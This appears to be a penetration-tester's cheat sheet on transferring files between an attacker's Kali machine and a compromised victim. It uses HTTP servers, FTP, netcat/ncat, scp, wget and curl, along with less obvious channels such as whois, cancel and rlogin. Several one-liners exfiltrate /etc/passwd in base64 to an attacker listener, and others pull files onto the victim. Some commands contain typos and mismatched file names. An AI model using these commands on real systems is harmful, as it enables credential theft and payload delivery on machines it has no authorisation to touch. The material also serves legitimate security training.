- - -
###### If noting works may this work :
- https://gtfobins.github.io/#+file%20upload

- - -
### Python web-server

**<u>Attacker</u>** :
```sh
python3 -m http.server 80
```

**<u>victim</u>** :
```sh
wget http://OUR_IP:80/file -o output-file
```
<br>

- - -
### ICMP-File-Transfer :  ( PYTHON2 )
[https://github.com/Vidimensional/Icmp-File-Transfer](https://github.com/Vidimensional/Icmp-File-Transfer)


```sh
icmp.py recv <destination file>

icmp.py send <file to transfer> <remote address>
```
<br>

- - -
### FTP : 

**<u>Attacker</u>** : 
```sh
sudo apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21 -u anonymous -P anonymous
```

**<u>Victim</u>** : 
```sh
victim : wget ftp://OUR_IP/File_name -o newfile
```
<br>

- - - 
### Ncat  :

**<u>Attacker</u>** : 
```sh
ncat -nv OUR_IP 443 --ssl < Outgoing_file
```

**<u>Victim</u>** : 
```sh
ncat -nvlp 443 --ssl > Incoming_file
```
<br>

- - -

### Sending the whole folder from target to our machine : 

**<u>Victim</u>** : 
```sh
tar -cvf folder.tar  folder
```

**<u>Attacker</u>** : 
```sh
nc -l -p 4456 > firefox.tgz
```

**<u>Victim</u>** : 
```sh
nc 'our_ip' 4456 < filder.tar
```

**<u>Attacker</u>** : 
```sh
tar xvf folder.tgz
```
<br>

- - - 

### SCP : 
Secure Copy (scp) 

**<u>Copy remote file to our kali</u>** : 
```sh
scp ramjai@192.168.0.10:<remote_file> /some/local/directory
```

**<u>Copy local file to target machine</u>** :
```sh
scp <local_file> your_username@192.168.0.10:/some/remote/directory
```

**<u>Copy local directory to target machine</u>** :
```sh
scp -r <local_dir> your_username@192.168.0.10:/tmp/<remote_dir>
```

**<u>Copy a file from one Target host to another</u>** :
```sh
scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2>:/some/remote/directory/
```

**<u>Improve scp performance (use blowfish)</u>** : 
```sh
scp -c blowfish <local_file> your_username@192.168.0.10:/some/remote/directory
```
<br>

- - -
### Downloading files : 

**<u>Wget</u>** : 
```sh
wget http://IP_ADDR/file -O /path/to/where/you/want/file/to/go
```

**<u>Curl</u>** : 
```sh
curl http://IP_ADDR/file  -O /path/to/where/you/want/file/to/go
```

**<u>Fetch</u>** : 
```sh
fetch http://IP_ADDR/file
```
<br>

- - -

### With "Cancle" and "rlogin" command : 

###### On Kali : 

```sh
nc -nlvp 18110
```

###### On Target :

```sh
cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
```

**Or** 

```sh
rlogin -l "$(cat /etc/passwd | base64)" -p <port> <ip>
```

- - -

### With WHOIS Command : 

###### On kali : 

```sh
cat file.txt | nc -vv -l -p 8000
```

###### On Victim : 

```sh
whois -h 127.0.0.1 -p 8000 "gimmehell" > newfile.txt
```


![Imgur](https://i.imgur.com/D9PHKHB.png)

Now,  on the victim machine After file successfully transfered. Press **CTRL+^C**

![Imgur](https://i.imgur.com/JLBW5jL.png)

- - -



